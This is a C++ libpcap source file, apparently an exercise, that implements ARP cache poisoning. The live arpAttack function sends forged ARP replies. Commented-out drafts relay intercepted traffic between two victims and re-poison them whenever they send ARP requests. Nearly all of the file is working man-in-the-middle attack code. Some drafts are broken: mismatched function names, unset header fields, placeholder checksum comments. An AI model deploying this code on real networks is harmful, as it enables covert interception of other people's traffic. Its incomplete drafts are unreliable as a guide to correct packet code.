
#include <cstdio>
#include <stdlib.h>
#include <string.h>
#include <iostream>
#include <pcap.h>
#include "etharp.h"

struct IpHdr {
    uint8_t v_:4;           // version
    uint8_t hdr_len_:4;     // header_length
    uint8_t tos_val_;

    uint16_t tot_len_;      // total_length
    uint16_t id_val_;       // identification
    
    uint8_t flags_val_:3;
    uint16_t frag_offset_:13;

    uint8_t ttl_val_;
    uint8_t protocol_val_;
    uint16_t checksum_val_;
    
    Ip src_ip_;             // sip
    Ip dest_ip_;            // dip
};

struct IcmpHdr {
    uint8_t type_;
    uint8_t code_;
    uint16_t check_;
    uint16_t id_;
    uint16_t seq_;

};

#pragma pack(push, 1)
struct EthIpPacket final{
        EthHdr eth_;
        IpHdr ip_;
	IcmpHdr icmp_; 
};

void arpAttack(pcap_t *handle, Mac my_mac, Mac sender_mac, const char* sender_ip, const char* target_ip)
{
        EthArpPacket packet;

        packet.eth_.dmac_ = sender_mac;
        packet.eth_.smac_ = my_mac;
        packet.eth_.type_ = htons(EthHdr::Arp);

        packet.arp_.hrd_ = htons(ArpHdr::ETHER);
        packet.arp_.pro_ = htons(EthHdr::Ip4);
        packet.arp_.hln_ = Mac::SIZE;
        packet.arp_.pln_ = Ip::SIZE;
        packet.arp_.op_ = htons(ArpHdr::Reply);
        packet.arp_.smac_ = my_mac;
        packet.arp_.sip_ = htonl(Ip(target_ip));
        packet.arp_.tmac_ = sender_mac;
        packet.arp_.tip_ = htonl(Ip(sender_ip));

        int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
        if (res != 0) {
                fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        }
}

/*
void packet_relay(pcap_t *handle,Mac my_mac, Mac target_mac, Mac sender_mac, const char* sender_ip, const char* target_ip)
{
        struct pcap_pkthdr *header;
        const u_char *response;
        while (true) {
                int pcap_next_res = pcap_next_ex(handle, &header, &response);
    
                if (pcap_next_res == 1) {
                        EthIpPacket *recv_packet = (EthIpPacket *)response; 
			
     
                if (ntohs(recv_packet->eth_.type_) == EthHdr::Ip4 && 
                        recv_packet->eth_.smac_ == sender_mac && recv_packet->eth_.dmac_ == my_mac) {
            		printf("I got sender's packet\n");
                        recv_packet->eth_.smac_ = my_mac;
                        recv_packet->eth_.dmac_ = target_mac;  
                int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(recv_packet), header->len);
                if (res != 0) {
                        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
                 }
                }
		if (ntohs(recv_packet->eth_.type_) == EthHdr::Ip4 &&
                     recv_packet->eth_.smac_ == target_mac &&
                     recv_packet->eth_.dmac_ == my_mac) {
			printf("I got target's packet\n");
                	recv_packet->eth_.smac_ = my_mac;
                	recv_packet->eth_.dmac_ = sender_mac;

                int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(recv_packet), header->len);
                if (res != 0) {
                    fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
                }
            }

                } 
                else if (pcap_next_res == -1 || pcap_next_res == -2) {
                printf("Error or Timeout reading the response: %s\n", pcap_geterr(handle)); 
                }

		

                }
}

/*  
void packet_relay(pcap_t *handle, Mac my_mac, Mac target_mac, Mac sender_mac, const char* sender_ip, const char* target_ip) {
    struct pcap_pkthdr *header;
    const u_char *response;

    while (true) {
        int pcap_next_res = pcap_next_ex(handle, &header, &response);

        if (pcap_next_res == 1) {
            EthIpPacket *recv_packet = (EthIpPacket *)response;

            
            if (ntohs(recv_packet->eth_.type_) == EthHdr::Ip4 &&
                recv_packet->eth_.smac_ == sender_mac &&
                recv_packet->eth_.dmac_ == my_mac) {

                recv_packet->eth_.smac_ = my_mac;
                recv_packet->eth_.dmac_ = target_mac;
		
		recv_packet->ip_.src_ip_ = inet_addr(sender_ip);
		recv_packet->ip_.dest_ip_ = inet_addr(target_ip);
			
		recv_packet->icmp_.type_ = 8;
		recv_packet->ip_.tot_len_ = htons(sizeof(IpHdr) + sizeof(IcmpHdr)); 

    
    		int packet_size = sizeof(EthHdr) + ntohs(recv_packet->ip_.tot_len_);

    		int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(recv_packet), packet_size);	

                //int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(recv_packet), sizeof(EthIpPacket));
                if (res != 0) {
                    fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
                }

		}

            

            
            if (ntohs(recv_packet->eth_.type_) == EthHdr::Ip4 &&
                     recv_packet->eth_.smac_ == target_mac &&
                     recv_packet->eth_.dmac_ == my_mac) {

                recv_packet->eth_.smac_ = my_mac;
                recv_packet->eth_.dmac_ = sender_mac;
		
		recv_packet->ip_.src_ip_ = inet_addr(target_ip);
                recv_packet->ip_.dest_ip_ = inet_addr(sender_ip);

		recv_packet->icmp_.type_ = 0;

                int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(recv_packet), sizeof(EthIpPacket));
                if (res != 0) {
                    fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
                }
            }
    }

         else if (pcap_next_res == -1 || pcap_next_res == -2) {
            printf("Error or Timeout reading the response: %s\n", pcap_geterr(handle));
            break;
        }
    }
}
*/
/*
void packet_relay(pcap_t *handle, Mac my_mac, Mac target_mac, Mac sender_mac, const char* sender_ip, const char* target_ip) {
    struct pcap_pkthdr *header;
    const u_char *response;

    while (true) {
        int pcap_next_res = pcap_next_ex(handle, &header, &response);

        if (pcap_next_res == 1) {
            EthIpPacket *recv_packet = (EthIpPacket *)response;

            
            if (ntohs(recv_packet->eth_.type_) == EthHdr::Ip4 &&
                recv_packet->eth_.smac_ == sender_mac &&
                recv_packet->eth_.dmac_ == my_mac) {
		printf("I got a sender's packet! and source mac is:");
		recv_packet->eth_.smac_.printMac();
		fflush(stdout);
                EthIpPacket new_packet;

    		// Ethernet header
    		new_packet.eth_.smac_ = my_mac;
    		new_packet.eth_.dmac_ = target_mac;
    		new_packet.eth_.type_ = htons(EthHdr::Ip4);

    		// IP header
    		// Note: Some fields are omitted for brevity, ensure to set them correctly
    		new_packet.ip_.src_ip_ = inet_addr(sender_ip);  // assuming sender_ip is your IP
    		new_packet.ip_.dest_ip_ = inet_addr(target_ip);

    		

    		int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&new_packet), sizeof(EthIpPacket));;
                if (res != 0) {
                    fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
                }
            }

            
            else if (ntohs(recv_packet->eth_.type_) == EthHdr::Ip4 &&
                     recv_packet->eth_.smac_ == target_mac &&
                     recv_packet->eth_.dmac_ == my_mac) {
		    printf("I got a target's packet! and source mac is :");
		    recv_packet->eth_.smac_.printMac();
		    fflush(stdout);

		    EthIpPacket new_packet;

    // Ethernet header
    			new_packet.eth_.smac_ = my_mac;
    			new_packet.eth_.dmac_ = sender_mac;
    			new_packet.eth_.type_ = htons(EthHdr::Ip4);

    // IP header
    // Note: Some fields are omitted for brevity, ensure to set them correctly
    			new_packet.ip_.src_ip_ = inet_addr(sender_ip);  // assuming sender_ip is your IP
    			new_packet.ip_.dest_ip_ = inet_addr(target_ip);

    // ICMP header
    
    // Note: Set other ICMP fields as needed

    // Calculate checksums
    // ...

    		int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&new_packet), sizeof(EthIpPacket));
                
                if (res != 0) {
                    fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
                }
            }

        } else if (pcap_next_res == -1 || pcap_next_res == -2) {
            printf("Error or Timeout reading the response: %s\n", pcap_geterr(handle));
            break;
        }
    }
}

void recover_check(pcap_t *handle,Mac my_mac, Mac target_mac, Mac sender_mac, const char* sender_ip, const char* target_ip)
{
        struct pcap_pkthdr *header;
        const u_char *response;

        sender_mac.printMac();
        fflush(stdout);

        target_mac.printMac();
        fflush(stdout);


        while (true) {
                int pcap_next_res = pcap_next_ex(handle, &header, &response);
    
                if (pcap_next_res == 1) {
                        EthArpPacket *recv_packet = (EthArpPacket *)response; 

     
                if (ntohs(recv_packet->eth_.type_) == EthHdr::Arp && (recv_packet->eth_.smac_ == sender_mac) &&(recv_packet->eth_.dmac_==Mac("ff:ff:ff:ff:ff:ff"))) {
                        printf("this is sender's broadcast");
                        recv_packet->eth_.smac_.printMac();
                        fflush(stdout);
                        arp_attack(handle, my_mac,sender_mac, sender_ip, target_ip); 
                        }
                         
		else if(ntohs(recv_packet->eth_.type_) == EthHdr::Arp && (recv_packet->eth_.smac_ == target_mac) && (recv_packet->eth_.dmac_ == Mac("ff:ff:ff:ff:ff:ff"))) {
                        printf("this is target's broadcast");
                        recv_packet->eth_.smac_.printMac();
                        fflush(stdout);
                        arp_attack(handle, my_mac, sender_mac, sender_ip, target_ip);
                        }
		else if(ntohs(recv_packet->eth_.type_) == EthHdr::Arp && (recv_packet->eth_.smac_ == sender_mac) && (recv_packet->eth_.dmac_ == my_mac)){
			printf("this is sender's unicast");
			recv_packet->eth_.smac_.printMac();
			fflush(stdout);
                        arp_attack(handle, my_mac, sender_mac, sender_ip, target_ip);
                }
		else if(ntohs(recv_packet->eth_.type_) == EthHdr::Arp && (recv_packet->eth_.smac_ == target_mac) && (recv_packet->eth_.dmac_ == my_mac))
                {
			printf("this is target's unicast");
                        recv_packet->eth_.smac_.printMac();
			fflush(stdout);
			arp_attack(handle, my_mac, target_mac, target_ip, sender_ip);
                	
		}
                

                }

                else if (pcap_next_res == -1 || pcap_next_res == -2) {
                printf("Error or Timeout reading the response: %s\n", pcap_geterr(handle));
            
        }
        }
        
}

*/